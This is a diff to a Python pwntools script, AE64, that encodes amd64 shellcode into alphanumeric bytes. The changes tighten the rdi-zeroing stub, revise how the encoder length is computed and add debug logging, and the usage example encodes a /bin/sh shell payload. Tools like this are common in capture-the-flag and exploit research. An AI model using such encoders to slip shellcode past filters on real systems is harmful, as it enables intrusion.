@@ -1,5 +1,5 @@
 #coding=utf8
-from pwn import context,asm,success,shellcraft
+from pwn import context,asm,success,shellcraft,debug
 context.arch = 'amd64'
 
 class AE64():
@@ -54,30 +54,16 @@ class AE64():
 		self.init_encoder = 'j0TYfi9XVWAXfi94WWAYjZTYfi9TVWAZjdTYfi9BgWZ'
 
 		self.zero_rdi_asm='''
-		/* save rax */
-		push rax
-		pop rcx
+		push rdi
 
-		/* push 0 */
-		push 0x61
-		pop rax
-		xor al,0x61
-		push rax
-
-		/* set rdi zero */
 		push rsp
-		pop rax
-		movsxd rdi,dword ptr[rax]
+		pop rcx
+		xor rdi,[rcx]
 
-		/* restore rax */
-		push rcx
-		pop rax
-
-		/* restore stack */
 		pop rcx
 		'''
 		# self.zero_rdi = asm(self.zero_rdi_asm)
-		self.zero_rdi = 'PYjaX4aPTXHc8QXY'
+		self.zero_rdi = 'WTYH39Y'
 		self.vaild_reg = ['rax','rbx','rcx','rdx','rdi','rsi','rbp','rsp',
 						'r8','r9','r10','r11','r12','r13','r14','r15']
 
@@ -119,16 +105,15 @@ class AE64():
 
 		self.raw_sc = raw_sc
 		self.pre_len = pre_len
-		self.encoder_len = int(len(self.raw_sc)*3.2)+len(self.prologue)
-
+		self.encoder_len=len(self.prologue)
 		if not self.encode_raw_sc():
 			print '[-] error while encoding raw_sc'
 			return None
 		while True:
-			print 'trying:',self.encoder_len
+			debug('AE64: trying length {}'.format(self.encoder_len))
 			encoder = asm(self.gen_encoder(self.pre_len+self.encoder_len))
 			final_sc = self.prologue+encoder
-			if self.encoder_len >= len(final_sc):
+			if self.encoder_len >= len(final_sc) and self.encoder_len-len(final_sc) <= 6:# nop len
 				break
 			self.encoder_len=len(final_sc)
 		nop_len = self.encoder_len - len(final_sc)
@@ -235,7 +220,7 @@ class AE64():
 		return sc
 
 if __name__ == "__main__":
-	print '[+] this is the usage'
+	print '[+] this is the usage:'
 	shsc = asm(shellcraft.sh())
 	loop = asm('loop: jmp loop')
 	obj = AE64()
